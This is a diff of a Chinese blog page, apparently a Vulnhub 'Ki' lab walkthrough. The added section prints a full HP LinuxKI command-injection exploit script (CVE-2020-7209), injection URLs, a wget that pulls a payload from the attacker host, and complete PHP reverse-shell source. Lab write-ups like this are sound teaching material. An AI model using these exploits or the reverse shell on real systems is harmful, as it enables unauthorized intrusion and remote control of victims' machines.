@@ -419,14 +419,14 @@ Starting Nm">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.1k
+                        2.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        5 分
+                        11 分
                     </div>
                     
                 
@@ -487,7 +487,7 @@ HOP RTT     ADDRESS
 1   0.78 ms 192.168.113.131
 
 
-</code></pre><h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><h3 id="寻找webshell无果"><a href="#寻找webshell无果" class="headerlink" title="寻找webshell无果"></a>寻找webshell无果</h3><p>开放了80端口，访问一下web页面，发现没有什么可以利用的漏洞</p>
+</code></pre><h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><h3 id="寻找webshell失败"><a href="#寻找webshell失败" class="headerlink" title="寻找webshell失败"></a>寻找webshell失败</h3><p>开放了80端口，访问一下web页面，发现没有什么可以利用的漏洞</p>
 <p><img src="http://alexjakin.github.io/medias/reward/ki/1.png" alt="web页面"></p>
 <p>于是我用gobuster开始去扫描一下目录结构，看看其他信息</p>
 <pre><code>
@@ -579,6 +579,206 @@ echo shell_exec(&quot;/opt/linuxki/runki -f&quot;);
 === runki for Linux version 6.0
 !!! runki script must be run as root
 !!! currently logged in with UID 33
+
+
+</code></pre><p>通过研究源码可以发现，一旦参数是environ就返回phpinfo页面，当参数名字是 <strong>file</strong> 时，就获取linuxki/experimental/vis/ 路径下的php文件内容，此时还是没有什么有用信息</p>
+<p>这时候搜索一下有没有关于runki或linuxki的漏洞，发现是存在的，将脚本文件下载到本地</p>
+<pre><code>
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# searchsploit linuxki
+-------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                        |  Path
+-------------------------------------------------------------------------------------- ---------------------------------
+HP LinuxKI 6.01 - Remote Command Injection                                            | multiple/remote/48483.txt
+-------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+</code></pre><p>查看脚本代码，</p>
+<pre><code>
+#!/usr/bin/env python3
+
+import requests
+import argparse
+import sys
+import re
+
+def parse_options():
+
+        formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
+        parser = argparse.ArgumentParser(description=&#39;HP LinuxKI &lt;= 6.0-1 RCE - CVE-2020-7209&#39;, formatter_class=formatter)
+        parser.add_argument(&quot;-i&quot;, &quot;--ip&quot;, dest=&#39;host&#39;, type=str, help=&quot;Target Hostname/IP&quot;, required=True)
+        parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, dest=&#39;port&#39;, type=str, help=&quot;Target Port&quot;, required=True)
+        parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, dest=&#39;cmd&#39;, type=str, help=&quot;Command to execute&quot;, required=True)
+        args = parser.parse_args()
+        return args
+
+def main(args):
+
+        host = args.host
+        port = args.port
+        cmd = args.cmd
+        path = &#39;/linuxki/experimental/vis/kivis.php?type=kitrace&amp;pid=15;echo BEGIN;%s;echo END;&#39; % cmd
+        rce = requests.get(&#39;http://&#39; + host + &#39;:&#39; + port + path, verify=False)
+        output = rce.text
+        a, b = output.find(&#39;BEGIN&#39;), output.find(&#39;END&#39;)
+        print(output[a+6:b])
+
+if __name__ in &quot;__main__&quot;:
+        args = parse_options()
+        main(args)  
+
+</code></pre><p>根据脚本代码，发现可能存在命令注入漏洞，访问：<strong><a target="_blank" rel="noopener" href="http://192.168.113.131/linuxki/experimental/vis/kivis.php?type=kitrace&amp;pid=15;whoami">http://192.168.113.131/linuxki/experimental/vis/kivis.php?type=kitrace&amp;pid=15;whoami</a></strong><br>在本地上传一句话木马，上传的shell自然是在当前路径<strong><a target="_blank" rel="noopener" href="http://192.168.113.131/linuxki/experimental/vis/shell.php">http://192.168.113.131/linuxki/experimental/vis/shell.php</a></strong>,</p>
+<p><img src="http://alexjakin.github.io/medias/reward/ki/5.png" alt="上传木马成功"></p>
+<p>使用蚁剑连接，发现获取webshell失败，估计是被拦截了，所以得使用其他方法</p>
+<p>尝试使用php反弹shell,将shell1 .php文件上传到靶机</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.113.131/linuxki/experimental/vis/kivis.php?type=kitrace&amp;pid=15|wget%20http://192.168.113.129:8000/shell1.php|">http://192.168.113.131/linuxki/experimental/vis/kivis.php?type=kitrace&amp;pid=15|wget%20http://192.168.113.129:8000/shell1.php|</a></p>
+</blockquote>
+<pre><code>
+set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = &#39;192.168.113.129&#39;;  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists(&#39;pcntl_fork&#39;)) &#123;
+    // Fork and have the parent process exit
+    $pid = pcntl_fork();
+
+    if ($pid == -1) &#123;
+        printit(&quot;ERROR: Can&#39;t fork&quot;);
+        exit(1);
+    &#125;
+
+    if ($pid) &#123;
+        exit(0);  // Parent exits
+    &#125;
+
+    // Make the current process a session leader
+    // Will only succeed if we forked
+    if (posix_setsid() == -1) &#123;
+        printit(&quot;Error: Can&#39;t setsid()&quot;);
+        exit(1);
+    &#125;
+
+    $daemon = 1;
+&#125; else &#123;
+    printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
+&#125;
+
+// Change to a safe directory
+chdir(&quot;/&quot;);
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) &#123;
+    printit(&quot;$errstr ($errno)&quot;);
+    exit(1);
+&#125;
+
+// Spawn shell process
+$descriptorspec = array(
+   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
+   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
+   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) &#123;
+    printit(&quot;ERROR: Can&#39;t spawn shell&quot;);
+    exit(1);
+&#125;
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+
+while (1) &#123;
+    // Check for end of TCP connection
+    if (feof($sock)) &#123;
+        printit(&quot;ERROR: Shell connection terminated&quot;);
+        break;
+    &#125;
+
+    // Check for end of STDOUT
+    if (feof($pipes[1])) &#123;
+        printit(&quot;ERROR: Shell process terminated&quot;);
+        break;
+    &#125;
+
+    // Wait until a command is end down $sock, or some
+    // command output is available on STDOUT or STDERR
+    $read_a = array($sock, $pipes[1], $pipes[2]);
+    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+    // If we can read from the TCP socket, send
+    // data to process&#39;s STDIN
+    if (in_array($sock, $read_a)) &#123;
+        if ($debug) printit(&quot;SOCK READ&quot;);
+        $input = fread($sock, $chunk_size);
+        if ($debug) printit(&quot;SOCK: $input&quot;);
+        fwrite($pipes[0], $input);
+    &#125;
+
+    // If we can read from the process&#39;s STDOUT
+    // send data down tcp connection
+    if (in_array($pipes[1], $read_a)) &#123;
+        if ($debug) printit(&quot;STDOUT READ&quot;);
+        $input = fread($pipes[1], $chunk_size);
+        if ($debug) printit(&quot;STDOUT: $input&quot;);
+        fwrite($sock, $input);
+    &#125;
+
+    // If we can read from the process&#39;s STDERR
+    // send data down tcp connection
+    if (in_array($pipes[2], $read_a)) &#123;
+        if ($debug) printit(&quot;STDERR READ&quot;);
+        $input = fread($pipes[2], $chunk_size);
+        if ($debug) printit(&quot;STDERR: $input&quot;);
+        fwrite($sock, $input);
+    &#125;
+&#125;
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we&#39;ve daemonised ourself
+// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) &#123;
+    if (!$daemon) &#123;
+        print &quot;$string\n&quot;;
+    &#125;
+&#125;
+
+?&gt; 
 
 
 </code></pre>
@@ -771,35 +971,30 @@ echo shell_exec(&quot;/opt/linuxki/runki -f&quot;);
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/05/30/vulnhubkibachangshizhanjilu/">
+                <a href="/2023/06/13/vulnhubnasefbachangshizhanjilu/">
                     <div class="card-image">
                         
-                        <img src="http://alexjakin.github.io/medias/reward/ki/1.png" class="responsive-img" alt="Vulnhub-Ki靶场实战记录">
+                        <img src="http://alexjakin.github.io/medias/reward/vulnhub/nasef/1.png" class="responsive-img" alt="Vulnhub-Nasef靶场实战记录">
                         
-                        <span class="card-title">Vulnhub-Ki靶场实战记录</span>
+                        <span class="card-title">Vulnhub-Nasef靶场实战记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">环境靶场地址：KI
-信息收集端口扫描确定靶机IP是192.168.113.131
+                    <div class="summary">环境靶场地址：Nasef
+信息收集端口扫描用nmap确认主机ip地址是192.168.113.133后开始端口扫描
 
-nmap -sP 192.168.113.1/24
-
-端口扫描
-
-nmap -p- -sV -A 192.168.113.131
+nmap -p- -sV -A 192.168.113.133
 
 
-Starting Nm</div>
+Starting Nmap 7.93 ( https:</div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2023-05-30
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2023-06-13
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -812,7 +1007,6 @@ Starting Nm</div>
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -1032,7 +1226,7 @@ nmap -p- -sV -A 192.168.113.132
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">71.6k</span>
+                <span class="white-color">72.9k</span>
             
 
             
